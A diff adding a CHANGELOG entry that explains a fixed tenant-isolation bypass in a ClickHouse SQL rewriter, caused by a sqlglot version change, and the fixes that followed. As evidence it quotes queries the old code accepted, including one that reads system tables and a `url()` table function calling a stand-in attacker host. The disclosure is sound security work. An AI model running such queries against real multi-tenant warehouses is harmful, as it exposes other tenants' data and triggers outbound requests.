@@ -95,6 +95,40 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ### Fixed
 
+- **The lake's tenant isolation could be switched off by resolving a
+  dependency one major version higher.** `lake_sql.rewrite_for_tenant` is the
+  only thing separating one tenant's events from another's in ClickHouse: it
+  parses untrusted operator SQL with sqlglot, enforces the table allowlist
+  against the parse tree, bans ClickHouse table functions, and injects the
+  `tenant_id` predicate. sqlglot 27 moved the SELECT's FROM clause from
+  `args["from"]` to `args["from_"]`. The table walk read the old key, got
+  nothing, and took the branch written for `SELECT 1` — "no FROM, so no tenant
+  data, nothing to do". Every single-table query then came back with no
+  allowlist check, no table-function ban and no tenant predicate, reported as
+  a successful rewrite.
+
+  `services/api/pyproject.toml` declared `sqlglot >=23.0.0,<31.0.0` while the
+  Dockerfile and every CI workflow declared `>=23,<27`, so this was reachable
+  by installing the service exactly as declared, and CI could not see it
+  because CI installed the narrow range. Verified on sqlglot 30.19.0 against
+  the pre-fix rewriter: `SELECT user_name FROM aisoc.raw_events` returned
+  unscoped, `SELECT * FROM system.tables` was accepted, and
+  `url('https://attacker.example/x', JSONEachRow)` was accepted — the last of
+  which makes the warehouse issue outbound HTTP with its own network identity.
+
+  Three changes rather than one, because pinning alone would leave the trap
+  armed for the next bump. The FROM clause now resolves by node type instead
+  of by key name. `rewrite_for_tenant` ends with an audit that takes its own
+  independent census of the statement's tables and raises the new
+  `LakeSqlIsolationError` unless every one of them was scoped, the tenant
+  survived into the rendered string, and every rendered SELECT that reads a
+  lake table carries the tenant in its own WHERE — so a partially scoped
+  UNION fails too. And all seven install paths now declare one identical
+  range, enforced by `scripts/check_sqlglot_pin.py`, with
+  `.github/workflows/lake-isolation.yml` running the rewriter suites against
+  both the shipped range and the next major so a future bump fails loudly
+  instead of quietly downgrading isolation.
+
 - **Scheduled hunts ran against credentials that could not exist, so every one
   of them returned zero hits.** The event-warehouse drivers resolved their
   endpoint and secret from `settings.ES_URL` / `ES_API_KEY` / `SPLUNK_URL` /
